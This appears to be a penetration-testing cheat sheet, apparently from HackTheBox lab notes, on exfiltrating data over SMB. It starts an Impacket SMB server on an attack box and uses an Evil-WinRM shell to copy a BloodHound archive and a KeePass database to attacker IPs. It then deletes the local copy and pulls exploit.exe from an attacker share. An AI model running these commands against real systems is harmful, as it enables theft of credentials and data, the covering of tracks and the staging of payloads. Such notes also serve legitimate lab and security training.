# Exfiltration

## SMB

Using smbserver.py on the attack box

{% code title="" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/htb$ smbserver.py share . -smb2support -username df -password df
/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.16.0-unknown is an invalid version and will not be supported in a future release
  warnings.warn(
Impacket v0.9.23.dev1+20210127.141011.3673c588 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed                                                                                                                                                                                                                      
[*] Config file parsed 
```
{% endcode %}

On the victim side:

{% code title="" overflow="wrap" lineNumbers="true" %}
```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.16.12\share /u:df df
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20220208134327_BloodHound.zip \\10.10.16.12\share\
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> del 20220208134327_BloodHound.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use /d \\10.10.16.12\share
\\10.10.16.12\share was deleted successfully.


```
{% endcode %}

### Copy file from victim to attack box

On attack box using impacket

{% code title="On attack box using impacket-smbserver" overflow="wrap" lineNumbers="true" %}
```
impacket-smbserver shared /home/kali/shared -smb2support -username jason -password lab
```
{% endcode %}

On Victim box

{% code title="From PS " overflow="wrap" lineNumbers="true" %}
```
Powershell:> copy .\Documents\Database.kdbx \\192.168.122.139\shared\Database.kdbx
```
{% endcode %}

### Using SMB

1. `Start evilshare with where you want to upload files from -`&#x20;
   1. `sudo smbserver.py evilshare .`
2. `net view \\10.10.16.13`
3. `dir \\10.10.16.13\EVILSHARE`
4. `copy \\10.10.16.13\EVILSHARE\exploit.exe exploit.exe`
